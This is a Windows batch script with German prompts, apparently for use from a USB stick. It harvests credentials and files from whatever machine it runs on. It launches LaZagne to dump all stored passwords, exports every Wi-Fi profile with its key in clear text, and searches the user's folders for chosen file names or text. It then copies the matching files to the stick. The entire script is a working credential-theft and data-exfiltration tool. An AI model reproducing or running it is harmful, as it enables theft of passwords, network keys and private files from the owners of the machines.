@echo off
echo welches Laufwerk?
set/P La=
%La%:
md %La%:\results\%username% 
echo Passwörter finden? j/n
set/P n=
If "%n%"=="j" (goto lzang) else (goto fragesuchen)

:lzang


start %La%:\laZagne.exe
laZagne all -v -oN
rename %La%:\results\credentials.txt Pass%username%.txt
netsh wlan export profile folder=%La%:\results\%username% key=clear
move /Y %La%:\results\Pass%username%.txt %La%:\results\%username%\
cls

:fragesuchen

echo willst du nach Dateien/Verzeichnisen oder nach Zeichensätzen in Dateien suchen? D/Z
set/P verf=
if "%verf%"=="d" (goto dateiensuchen) 
if "%verf%"=="z" (goto zeichensuchen) else (goto end)




:dateiensuchen

echo Nach was willst du suchen ?
set/P i=
C:
cd C:\users\%username%
dir /a-s /B /S "*%i%*" 
echo Willst du es auf den Stick ziehen oder neu suchen ? j/n/s
set/P v=
If "%v%"=="j" (goto stickdateien)
if "%v%"=="s" (goto fragesuchen) else (goto end)

:zeichensuchen

echo Nach was willst du suchen ?
set/P u=
C:
cd C:\users\%username%
for /f %%x in ('dir /B') do findstr /S /I /M /P /C:"%u%" C:\users\%username%\%%x\*
echo Willst du es auf den Stick ziehen oder neu suchen ? j/n/s
set/P v=
If "%v%"=="j" (goto stickzeichen)
if "%v%"=="s" (goto fragesuchen) else (goto end)




:stickdateien

dir /a-s /B /S *%i%* > %La%:\results\%username%\Pfade.txt
For /f "delims=*" %%g IN ('dir /a-s /B /S "*%i%*"') do xcopy /I /G /h /Y "%%g" %La%:\results\%username%
echo Willst du weiter suchen ? j/n
set/P v=
If "%v%"=="j" (goto fragesuchen)


:stickzeichen
for /f %%x in ('dir /B') do findstr /S /I /M /P /C:"%u%" C:\users\%username%\%%x\* >> %La%:\results\%username%\pfad2.txt
for /f "delims=*"  %%b in (%La%:\results\%username%\pfad2.txt) do xcopy /I /G /h /Y "%%b" %La%:\results\%username%

echo Willst du weiter suchen ? j/n
set/P v=
If "%v%"=="j" (goto fragesuchen)

:end
